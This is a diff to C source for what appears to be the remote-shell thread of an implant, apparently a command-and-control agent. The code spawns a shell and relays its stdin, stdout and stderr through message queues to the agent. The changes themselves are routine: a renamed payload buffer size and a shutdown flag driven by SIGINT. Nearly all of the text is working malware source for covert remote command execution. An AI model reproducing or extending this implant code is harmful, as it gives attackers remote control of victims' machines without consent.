@@ -5,6 +5,8 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <string.h>
+#include <pthread.h>
+#include <signal.h>
 
 #include "queue.h"
 #include "implant.h"
@@ -19,6 +21,8 @@ extern Queue* shell_receive_queue;
 extern pthread_mutex_t shell_receive_queue_lock;
 extern Queue* shell_send_queue;
 extern pthread_mutex_t shell_send_queue_lock;
+// SIGINT flags
+extern volatile sig_atomic_t agent_close_flag;
 
 typedef struct Pipes{
 	int pipefd[2];
@@ -33,7 +37,7 @@ STATIC int execute_shell(){
 	Shell_Pipes shell_pipes = {0};
 	Queue_Message* message;
 	int nbytes = 0;
-	char buf[FIRST_PAYLOAD_SIZE];
+	char buf[PAYLOAD_SIZE];
 	char* buffer;
 	int ret_val = RET_OK;
 	
@@ -102,7 +106,7 @@ STATIC int execute_shell(){
 			}
 			
 			// Read from STDOUT
-			nbytes = read(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], buf, FIRST_PAYLOAD_SIZE);
+			nbytes = read(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE);
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDOUT read from shell: %d\n", errno);
@@ -123,10 +127,10 @@ STATIC int execute_shell(){
 					printf("ERROR agent_prepare_message error\n");
 				}
 			}
-			memset(buf, 0, FIRST_PAYLOAD_SIZE);
+			memset(buf, 0, PAYLOAD_SIZE);
 			
 			// Read from STDERR
-			nbytes = read(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], buf, FIRST_PAYLOAD_SIZE);
+			nbytes = read(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE);
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDERR read from shell: %d\n", errno);
@@ -140,7 +144,7 @@ STATIC int execute_shell(){
 			else{
 				printf("DEBUG STDERR: %s\n", buf);
 			}
-			memset(buf, 0, FIRST_PAYLOAD_SIZE);
+			memset(buf, 0, PAYLOAD_SIZE);
 		}
 		
 		close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);							// close input of STDIN
@@ -156,12 +160,14 @@ STATIC int execute_shell(){
 void *shell_thread(void *vargp){
 	int ret_val;
 	
-	for (;;){
+	while (!agent_close_flag){
 		if ((ret_val = execute_shell()) != RET_OK){
 			printf("ERROR execute shell\n");
 			exit(RET_ERROR);
 		}
 	}
+
+	debug_print("%s\n", "shell thread done");
 	
 	return 0;
 }
